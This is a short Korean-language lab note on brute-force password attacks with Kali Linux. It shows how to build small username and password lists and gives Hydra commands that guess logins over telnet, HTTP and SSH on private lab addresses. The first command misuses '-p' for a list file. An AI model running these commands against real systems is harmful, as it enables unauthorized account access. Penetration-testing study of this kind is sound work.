## Kali

### 무차별 대입 공격(Brute Force Attkack)

* 다양한 암호화된 키 또는 패스워드의 가능한 모든 조합을 시도하여 올바른 값을 찾아내는 기법이다.
* 이를 수행하는 도구들은 네트워크 보안 평가 및 침투 테스트에서 널리 사용된다.
* 대표적인 무차별 대입 공격 도구는 Hydra, Medusa, Ncrack, John the Ripper 등이 있다.


### Hydra

cat > usernames.txt

>ccna<br/>
>ccnp<br/>
>ccie<br/>
Ctrl + D<br/>

cat > passwords.txt

>cisco2<br/>
>cisco1<br/>
>cisco<br/>
Ctrl + D<br/>

hydra -l ccnp -p passwords.txt telnet://10.1.1.11 -V -f (-l: 아이디를 안다 | -p 패스워드는 모른다 | -V : 자세히 보고싶다 | -f 알면 종료하라)

 hydra -L usernames.txt -P passwords.txt telnet://10.1.1.12 -V -f


R1(config)#ip http authentication local 

hydra -L usernames.txt -P passwords.txt http-get://10.1.1.21 -V -f (http 공격)<br/>
hydra -L usernames.txt -P passwords.txt ssh://10.1.1.21 -V -f  (ssh)<br/>
